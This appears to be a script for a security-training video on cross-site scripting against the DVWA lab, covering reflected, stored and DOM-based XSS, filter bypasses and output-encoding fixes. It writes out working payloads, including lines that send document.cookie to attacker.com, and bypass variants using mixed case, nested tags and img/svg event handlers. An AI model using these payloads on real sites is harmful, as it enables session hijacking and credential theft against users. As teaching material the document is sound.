# VIDEO 29: Cross-Site Scripting (XSS)
### Reflected, Stored & DOM-Based XSS Discovery
**Suggested length:** 17–21 minutes
**License Tier:** Free
**Certification Relevance:** OSCP: Web Application Attacks | CEH: Web Application Hacking

---

## INTRO (0:00 – 1:45)

**[Screen: Huginn splash screen with Section 5 title card "Web Application Exploitation"]**

> "Welcome back to the Huginn tutorial series. In this video we're covering Cross-Site Scripting — XSS — the most prevalent web application vulnerability by sheer volume. Unlike SQL injection which targets the server's database, XSS targets other users of the application by injecting malicious client-side scripts into pages that victims then view and execute in their browsers."

**[Screen: Warning banner — red background with white text: "⚠️ LAB ENVIRONMENT ONLY — ETHICAL TESTING DISCLAIMER"]**

> "Important safety reminder. All demonstrations in this video are performed against DVWA running in an isolated lab environment that I own and control. Cross-Site Scripting attacks against real websites without explicit authorization are illegal under computer crime laws. Never inject scripts into applications you don't have written permission to test. XSS can steal session cookies, redirect users to phishing pages, and perform actions on their behalf — these are serious attacks with real consequences."

**[Screen: Slide showing three XSS categories — Reflected (Type 1), Stored (Type 2), DOM-Based (Type 0) with brief flow diagrams]**

> "We'll cover three distinct types today. Reflected XSS — where the payload is in the URL and reflects back immediately in the response. Stored XSS — where the payload persists in the server's database and executes every time any user loads the affected page. And DOM-based XSS — where the vulnerability exists entirely in client-side JavaScript without server involvement. We'll demonstrate all three against DVWA, starting at Security Level Low, then escalating to Medium to show how input filters can be bypassed. This builds directly on the SQL injection concepts from the previous video (see Video 28: SQL Injection)."

---

## SECTION 1: XSS Fundamentals and Impact (1:45 – 3:45)

**[Screen: Diagram showing XSS attack flow — Attacker crafts URL → Victim clicks link → Browser executes script → Session cookie sent to attacker]**

> "XSS exploits the trust a user's browser has in the content served by a legitimate website. When a page includes attacker-controlled content without proper encoding, the browser can't distinguish it from legitimate page code. The injected script runs with the full privileges of the page's origin — accessing cookies, DOM content, and making requests on behalf of the user."

**[Screen: Table showing XSS impact — Cookie Theft, Session Hijacking, Keylogging, Phishing, Defacement, Credential Harvesting, Worm Propagation]**

> "The impact of XSS ranges from annoyance to complete account takeover. Cookie theft lets an attacker hijack active sessions. Keyloggers capture everything typed into the page. Phishing overlays can harvest credentials. Stored XSS can propagate like a worm — the Samy MySpace worm in 2005 infected over a million profiles in under 24 hours through stored XSS."

**[Screen: Code comparison — Vulnerable code: `echo "Hello " + user_input` vs Safe code: `echo "Hello " + htmlspecialchars(user_input)`]**

> "The root cause is always the same — user input rendered in HTML context without proper output encoding. The fix is context-aware output encoding. In HTML context, encode angle brackets and quotes. In JavaScript context, use JSON encoding. In URL context, use percent-encoding. The key word is output encoding — sanitize at the point of rendering, not at input."

---

## SECTION 2: Huginn XSS Detection Interface (3:45 – 5:30)

**[Screen: Huginn application — navigating to Web Exploits → XSS testing panel within the injection tester]**

> "In Huginn, XSS testing is integrated into the Web Exploits module through the Basic Injection Tester. Navigate to Web Exploits from the sidebar. The injection tester automatically discovers forms and URL parameters on a target page, then tests each one with a curated set of XSS payloads."

**[Screen: Huginn Web Exploits page — showing the target URL input, scan button, and the form analysis pane]**

> "Enter your target URL and click Scan. Huginn's Form Analyzer parses the page HTML, identifies all forms, extracts input fields and their types, determines the submission method — GET or POST — and maps the full attack surface. Each discovered input becomes a potential injection point."

**[Screen: Huginn injection tester results — showing detected XSS vulnerabilities with severity, parameter, and payload details]**

> "When a vulnerability is found, it appears in the results with the severity rating — XSS is flagged as HIGH — the affected URL, the vulnerable parameter name, and the exact payload that triggered it. Huginn confirms XSS by checking whether the injected payload appears unmodified in the response. If the payload reflects back without encoding, that's a confirmed reflected XSS. Let's see this in action against DVWA."

---

## SECTION 3: Reflected XSS — Security Low (5:30 – 9:00)

**[Screen: Browser — DVWA → XSS (Reflected) module, Security Level Low]**

> "Navigate to DVWA's XSS Reflected module. You'll see a simple form asking 'What's your name?' with a text input and Submit button. At Low security, the application takes whatever you enter and echoes it directly into the page with zero sanitization."

```bash
# Normal behavior
Input: Allie
Result: Page displays "Hello Allie"
# Our input is reflected directly into the HTML response
```

**[Screen: DVWA XSS Reflected — entering a name and seeing it reflected in the page output]**

> "Enter any name and submit. The page responds with 'Hello' followed by your input. The critical observation is that our input is placed directly into the HTML body. If we can inject HTML or JavaScript syntax, it will be rendered as code rather than text."

**[Screen: DVWA XSS Reflected — entering `<script>alert('XSS')</script>` in the name field]**

> "Let's inject a basic script tag. Enter `<script>alert('XSS')</script>` and submit."

```bash
# Basic reflected XSS — script tag injection
Input: <script>alert('XSS')</script>
Result: JavaScript alert box appears with "XSS"
# Payload reflected unencoded → browser executes the script
```

**[Screen: JavaScript alert dialog box appearing with "XSS" — confirming code execution]**

> "The alert box fires. Our script tag was inserted directly into the HTML and the browser executed it. This is reflected XSS — the payload travels through the URL or form parameter and reflects back in the immediate response. In a real attack, you'd craft a malicious URL and trick the victim into clicking it."

**[Screen: Showing the page source — highlighting where the injected script tag appears in the HTML]**

> "View the page source and you'll see our script tag sitting right there in the HTML body — `Hello <script>alert('XSS')</script>`. The browser sees valid HTML and JavaScript, so it executes it. Now let's craft a more impactful payload — cookie theft."

```bash
# Cookie theft payload — sends document.cookie to attacker server
Input: <script>new Image().src="http://attacker.com/steal?cookie="+document.cookie;</script>
Result: Request sent to attacker.com with victim's session cookie

# Cookie value captured (example):
# PHPSESSID=abc123def456; security=low
```

**[Screen: Network tab showing the outbound request to attacker.com with cookie data in the URL — lab demonstration only]**

> "This payload creates an invisible image element whose source URL includes the victim's cookies as a parameter. When the browser loads this 'image,' it sends a GET request to the attacker's server with the full cookie string. In a real scenario, the attacker would capture the PHPSESSID value and hijack the victim's session. Again — this is lab-only demonstration."

---

## SECTION 4: Stored XSS — Persistent Attacks (9:00 – 12:30)

**[Screen: DVWA — navigating to XSS (Stored) module]**

> "Now let's look at stored XSS — the more dangerous variant. Navigate to DVWA's XSS Stored module. This is a guestbook application where users can post messages that are stored in the database and displayed to every subsequent visitor."

**[Screen: DVWA XSS Stored — showing the guestbook form with Name and Message fields, plus previous entries]**

> "The guestbook has Name and Message fields. Previous entries are shown below the form. Anything we post persists — every user who visits this page will see our entry, and if it contains JavaScript, every user's browser will execute it."

```bash
# Normal guestbook entry
Name: TestUser
Message: This is a normal guestbook entry.
Result: Entry appears in the guestbook for all visitors
```

**[Screen: DVWA XSS Stored — entering an XSS payload in the Message field]**

> "Let's inject a stored XSS payload in the message field. Unlike reflected XSS where the victim needs to click a crafted link, stored XSS activates for every single visitor automatically."

```bash
# Stored XSS — script injection in guestbook message
Name: Attacker
Message: <script>alert('Stored XSS - Every visitor sees this')</script>
Result: Payload saved to database, alert fires on every page load
```

**[Screen: Alert dialog appearing — then refreshing the page to show it fires again on every visit]**

> "Submit the entry. The alert fires immediately. Now refresh the page — it fires again. Navigate away and come back — it fires again. This script is now permanently stored in the database and executes every time the guestbook page loads, regardless of who is viewing it."

**[Screen: Demonstrating the persistent nature — opening the page in a different browser session showing the same alert]**

> "Open this page in a different browser or incognito window — simulating a different user visiting. The alert fires there too. In a real-world scenario, this could be a keylogger capturing admin credentials, a cryptocurrency miner, or a worm that posts the same payload to every page the victim has access to."

```bash
# More impactful stored XSS — session hijacking for all visitors
Name: Normal User
Message: Great site! <script>fetch('http://attacker.com/log?c='+document.cookie)</script>
Result: Every visitor's cookies sent to attacker when they view the guestbook
```

**[Screen: Showing that the Name field has a character limit but the Message field accepts longer payloads]**

> "Note that the Name field in DVWA has a maxlength attribute limiting it to 10 characters client-side. But the Message field has enough room for full payloads. Also notice — the Name field is also injectable but you'd need to bypass the client-side length restriction by intercepting the request."

```bash
# Bypassing client-side maxlength on Name field (intercept and modify)
# Original request: txtName=Attacker&mtxMessage=Normal+msg&btnSign=Sign+Guestbook
# Modified: txtName=<script>alert('name')</script>&mtxMessage=Normal+msg&btnSign=Sign+Guestbook
```

---

## SECTION 5: DOM-Based XSS (12:30 – 14:30)

**[Screen: Slide explaining DOM-based XSS — "Vulnerability in client-side JavaScript — payload never sent to server"]**

> "The third type is DOM-based XSS. Here, the vulnerability exists entirely in client-side JavaScript code. The payload is processed by the browser's JavaScript engine without being sent to or reflected from the server. This makes it invisible to server-side logging and WAFs that only inspect HTTP traffic."

**[Screen: Code example showing vulnerable DOM manipulation — `document.getElementById('output').innerHTML = location.hash.substring(1);`]**

> "DOM-based XSS typically occurs when client-side code reads from a user-controllable source — like `document.location`, `document.URL`, `location.hash`, or `document.referrer` — and writes it to a dangerous sink like `innerHTML`, `document.write`, or `eval`. The data flows from source to sink entirely within the browser."

```bash
# DOM-based XSS — payload in URL fragment (not sent to server)
# Vulnerable code: document.write("Current language: " + document.location.href.split("default=")[1])

URL: http://localhost/dvwa/vulnerabilities/xss_d/?default=English
Normal: Page displays "Current language: English"

URL: http://localhost/dvwa/vulnerabilities/xss_d/?default=<script>alert('DOM-XSS')</script>
Result: JavaScript executes — alert box appears
```

**[Screen: DVWA XSS DOM module — showing the language selector and URL parameter]**

> "In DVWA's XSS DOM module, there's a language selector dropdown that reads its default value from a URL parameter. The client-side JavaScript takes that parameter value and writes it into the page using an insecure method. By manipulating the URL parameter, we inject code that executes entirely client-side."

**[Screen: Browser showing the DOM XSS executing — alert dialog from the URL parameter payload]**

> "The key difference — if you check the server access logs, our payload never appears there. It stays in the URL fragment or parameter but is only processed by the JavaScript on the page. This is important for OSCP — DOM-based XSS bypasses server-side input filters because the malicious data never reaches the server for filtering."

```bash
# Alternative DOM XSS payloads
URL: http://localhost/dvwa/vulnerabilities/xss_d/?default=</select><img src=x onerror=alert('DOM')>
URL: http://localhost/dvwa/vulnerabilities/xss_d/?default=</select><svg onload=alert('DOM')>
```

---

## SECTION 6: Security Level Medium — Filter Bypass Techniques (14:30 – 17:30)

**[Screen: DVWA Security settings — changing level from Low to Medium]**

> "Let's raise the security level to Medium and see what defenses are implemented. Navigate to DVWA Security and switch to Medium."

**[Screen: DVWA XSS Reflected at Medium — attempting the basic script tag payload]**

> "Go back to XSS Reflected and try our basic payload `<script>alert('XSS')</script>`. Submit it."

```bash
# Medium security — basic script tag blocked
Input: <script>alert('XSS')</script>
Result: Page displays "Hello alert('XSS')" — script tags stripped
# The str_replace function removes "<script>" (case-sensitive)
```

**[Screen: Page showing "Hello alert('XSS')" — the script tags have been removed but the content remains]**

> "The script tags are gone — the page shows just the alert text. At Medium security, DVWA uses `str_replace` to remove `<script>` from the input. But this defense has a critical flaw — it's case-sensitive and doesn't handle nested or alternative payloads."

```bash
# Bypass 1: Mixed case — str_replace is case-sensitive
Input: <Script>alert('XSS')</Script>
Result: Alert fires! Mixed case bypasses the filter.

# Bypass 2: Nested tags — filter only removes one instance
Input: <scr<script>ipt>alert('XSS')</scr</script>ipt>
Result: After removal of inner <script>, outer <script> remains → alert fires

# Bypass 3: Event handlers — no script tag needed
Input: <img src=x onerror=alert('XSS')>
Result: Alert fires! img tag with error handler is not filtered.
```

**[Screen: Alert dialog appearing from the mixed-case bypass — confirming execution]**

> "Three bypasses. First, mixed case — `<Script>` bypasses a filter looking for lowercase `<script>`. Second, nested tags — when the filter removes the inner `<script>`, it reconstructs a valid outer script tag from the remaining characters. Third, event handlers — we don't need script tags at all. An img tag with an invalid source triggers the onerror handler, executing our JavaScript."

**[Screen: DVWA XSS Stored at Medium — demonstrating the same bypass in stored context]**

> "The same bypasses work on the Stored XSS module at Medium. The Name field has additional protection with a stricter filter, but the Message field uses the same weak str_replace approach."

```bash
# Stored XSS bypass at Medium — using event handlers
Name: Normal
Message: <img src=x onerror=alert('Stored-Medium')>
Result: Persistent XSS — alert fires for every visitor

# SVG-based payload (another alternative)
Name: Normal
Message: <svg onload=alert('SVG-XSS')>
Result: Fires on page load without user interaction
```

**[Screen: Results from Huginn's injection tester — showing multiple XSS findings with different bypass payloads]**

> "When you run Huginn's injection tester against a Medium-security target, it automatically cycles through these bypass variants. The tool tests mixed case, double-encoding, event handlers, SVG tags, and other vectors to find payloads that evade the specific filter implementation."

---

## SECTION 7: Certification Mapping and Practice (17:30 – 18:45)

**[Screen: Slide showing OSCP and CEH mapping for XSS]**

> "XSS maps to the OSCP Web Application Attacks domain. While the OSCP exam historically focuses more on server-side vulnerabilities, XSS can sometimes be a stepping stone — for example, stealing admin cookies to access restricted functionality that leads to further exploitation. For CEH, XSS is covered extensively in Module 14 — Hacking Web Applications, including reflected, stored, and DOM variants."

**[Screen: Slide listing practice resources — THM rooms, HTB machines]**

> "For practice, the TryHackMe 'XSS' room provides structured learning across all three types. The 'OWASP Juice Shop' has multiple XSS challenges with increasing difficulty. On Hack The Box, machines like 'Stocker' and 'Precious' include XSS in their attack chains. DVWA at High security implements stronger regex-based filtering — try to bypass it. At Impossible security, study the proper implementation using `htmlspecialchars()` with ENT_QUOTES flag."

---

## OUTRO (18:45 – end)

**[Screen: Summary slide — XSS: Reflected (URL), Stored (Database), DOM-Based (Client-Side) | Filter Bypass: Case, Nesting, Events | Next: Video 30 — Server-Side Template Injection]**

> "That wraps up Cross-Site Scripting in Huginn. We demonstrated reflected XSS through URL parameters, stored XSS that persists in the database and affects every visitor, DOM-based XSS that operates entirely client-side, and multiple filter bypass techniques at Medium security. In the next video, we move to Server-Side Template Injection — SSTI — where instead of injecting code that runs in the victim's browser, we inject code that executes on the server itself. See you there."
